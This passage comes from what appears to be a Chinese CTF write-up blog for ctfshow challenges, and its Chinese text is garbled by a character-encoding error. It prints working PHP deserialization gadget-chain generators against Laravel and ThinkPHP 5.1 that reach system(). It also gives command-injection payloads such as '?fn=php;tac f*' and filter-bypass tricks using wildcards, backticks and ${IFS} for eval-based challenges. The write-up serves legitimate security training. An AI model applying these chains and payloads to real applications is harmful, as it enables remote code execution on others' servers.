language_">$this</span>-&gt;config = <span class="variable">$config</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">EvalLoader</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>, <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">line</span> = <span class="title class_">new</span> <span class="title class_">PhpParser</span>\<span class="title class_">Node</span>\<span class="title class_">Scalar</span>\<span class="title class_">MagicConst</span>\<span class="title class_">Line</span>();</span><br><span class="line">    <span class="variable">$mockdefinition</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Generator\MockDefinition</span>(<span class="variable">$line</span>,<span class="string">&quot;&lt;?php system(&#x27;tac /f*&#x27;);&quot;</span>);</span><br><span class="line">    <span class="variable">$evalloader</span> = <span class="keyword">new</span> <span class="title class_">Mockery\Loader\EvalLoader</span>();</span><br><span class="line">    <span class="variable">$dispatcher</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Bus\Dispatcher</span>(<span class="keyword">array</span>(<span class="variable">$evalloader</span>,<span class="string">&#x27;load&#x27;</span>));</span><br><span class="line">    <span class="variable">$queuedcommand</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Console\QueuedCommand</span>(<span class="variable">$mockdefinition</span>);</span><br><span class="line">    <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Broadcasting\PendingBroadcast</span>(<span class="variable">$dispatcher</span>,<span class="variable">$queuedcommand</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="web273"><a class="markdownIt-Anchor" href="#web273">#</a> web273ï¼š</h1><p>â€‹ç”¨è¿™ä¸ª pocï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>\<span class="title class_">Dispatcher</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>\<span class="title">QueuedCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events=<span class="keyword">new</span> <span class="title class_">Dispatcher</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event=<span class="keyword">new</span> <span class="title class_">QueuedCommand</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">connection</span>=&quot;<span class="title class_">cat</span> /<span class="title class_">flag</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">queueResolver</span>=&quot;<span class="title class_">system</span>&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>\<span class="title class_">PendingBroadcast</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingBroadcast</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="web274"><a class="markdownIt-Anchor" href="#web274">#</a> web274ï¼š</h1><p>â€‹thinkphp ååºåˆ—åŒ–ï¼Œè´´ä¸ªæ–‡ç« ï¼š<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjYxOT90aW1lX18xMzExPW40JTJCeG5EMERnNyUzRDd3eFdxR05ubURVeFlxS1F1NUQ1aTVRNXBkeCN0b2MtMQ==">thinkphp5.1.x~5.2.x ç‰ˆæœ¬ååºåˆ—åŒ–é“¾æŒ–æ˜åˆ†æ</span></p><p>â€‹æ”¾ä¸ª pocï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;lin&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;lin&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// è¡¨å•ajaxä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;lin&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹ç„¶åï¼Œå°†ç”Ÿæˆçš„ payload æ”¾åœ¨ä¸‹é¢çš„ payload å¤„ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=payload<span class="built_in">&amp;</span>lin=tac /f*</span><br></pre></td></tr></table></figure><p>â€‹å³å¯å¾—åˆ° flagã€‚</p><h1 id="web275"><a class="markdownIt-Anchor" href="#web275">#</a> web275ï¼š</h1><p>â€‹å°å£°å˜€å’•ï¼šä¸ºä»€ä¹ˆè¿˜æ²¡æœ‰ pop é“¾ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-08 19:13:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-08 20:08:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">where is flag?</span><br></pre></td></tr></table></figure><p>â€‹æƒ³åŠæ³•è§¦å‘ <code>__destruct</code>  å³å¯ï¼Œè¿™é‡Œéœ€è¦ filename æˆ–è€… filecontent åŒ…å« php æˆ–è€… flagï¼Œè¿™æ ·åœ¨æœ€åé”€æ¯çš„æ—¶å€™ä¼šè¿›å…¥ system å‡½æ•°ï¼Œå¹¶ä¸” checkevil () ä¸º trueï¼Œä¸ä¼šè¿›å…¥ if è¯­å¥ï¼Œç¨‹åºä¼šè¿›å…¥æœ€åçš„é”€æ¯é˜¶æ®µï¼Œè§¦å‘ <code>__destruct</code> ï¼Œå› æ­¤ï¼Œå³å¯è¿›å…¥ system å‡½æ•°ï¼Œæ‰€ä»¥ payload ä¸ºï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fn=php;tac f*</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Webç‹—çš„è‡ªæˆ‘å®‰æ…° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-å‘½ä»¤æ‰§è¡Œ</title>
      <link href="/posts/53e2b2e1.html"/>
      <url>/posts/53e2b2e1.html</url>
      
        <content type="html"><![CDATA[<h1 id="web29"><a class="markdownIt-Anchor" href="#web29">#</a> Web29ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº†æ–‡ä»¶å…³é”®è¯ï¼Œé€šé…ç¬¦ç»•è¿‡ï¼Œcat f*ï¼Œç”¨ system æ‰§è¡Œï¼Œå‘ç°æ²¡æœ‰æˆåŠŸè¯»å–ï¼Œè€ƒè™‘ä½¿ç”¨ tac å€’åºè¯»å–ï¼Œå¾—åˆ° flagã€‚</p><p>â€‹<strong>æ€»ç»“ï¼Œæ–‡ä»¶å…³é”®è¯è¿‡æ»¤å¯ä»¥è€ƒè™‘ä½¿ç”¨é€šé…ç¬¦ç»•è¿‡ã€‚</strong></p><h1 id="web30"><a class="markdownIt-Anchor" href="#web30">#</a> Web30ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº† systemï¼Œå¹¶ä¸”ç”¨çš„å± eval å‡½æ•°ã€‚</p><p>â€‹è¿™é‡Œå…ˆè¯•è¯•åæ–œæ ç»•è¿‡ï¼Œä¼¼ä¹æ— æ³•ç»•è¿‡ã€‚</p><p>â€‹é‚£ä¹ˆå°±è¯•ç€åå¼•å·ç»•è¿‡ï¼Œecho `ls`; ï¼ŒæˆåŠŸç»•è¿‡ï¼Œä¹‹åç›´æ¥ echo `tac fl*`; è¯»å– flagã€‚</p><h1 id="web31"><a class="markdownIt-Anchor" href="#web31">#</a> Web31ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå‘ç°ç©ºæ ¼ï¼Œå•å¼•å·è¢«è¿‡æ»¤äº†ï¼Œè¿˜æœ‰å°æ•°ç‚¹ï¼Œæ²¡æœ‰è¿‡æ»¤åå¼•å·ï¼Œç›´æ¥åå¼•å·ç»•è¿‡ï¼ŒæˆåŠŸç»•è¿‡ systemï¼Œcat è¢«è¿‡æ»¤å°± tac è¯»å–ï¼Œç©ºæ ¼ç”¨ %0a æˆ–è€… %09 ç»•è¿‡ã€‚</p><p>â€‹å‰ç½®çŸ¥è¯†ï¼š</p><p><strong>ç©ºæ ¼è¿‡æ»¤ï¼š</strong></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%09 ç¬¦å·éœ€è¦phpç¯å¢ƒ</span></span><br><span class="line">&#123;cat,flag.txt&#125; </span><br><span class="line">cat<span class="built_in">$</span>&#123;IFS&#125;flag.txt</span><br><span class="line">cat<span class="built_in">$</span>IFS<span class="built_in">$</span>9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=<span class="built_in">$</span>&#x27;<span class="keyword">\x</span>20flag.txt&#x27;<span class="built_in">&amp;</span><span class="built_in">&amp;</span>cat<span class="built_in">$</span>kg</span><br><span class="line">(<span class="keyword">\x</span>20è½¬æ¢æˆå­—ç¬¦ä¸²å°±æ˜¯ç©ºæ ¼ï¼Œè¿™é‡Œé€šè¿‡å˜é‡çš„æ–¹å¼å·§å¦™ç»•è¿‡)</span><br></pre></td></tr></table></figure><p><strong>cat è¿‡æ»¤ï¼š</strong></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹</span><br><span class="line">less:ä¸ more ç±»ä¼¼ã€‚ä½†åœ¨ç”¨ more æ—¶å€™å¯èƒ½ä¸èƒ½å‘ä¸Šç¿»é¡µï¼Œä¸èƒ½å‘ä¸Šæœç´¢æŒ‡å®šå­—ç¬¦ä¸²ï¼Œè€Œ less 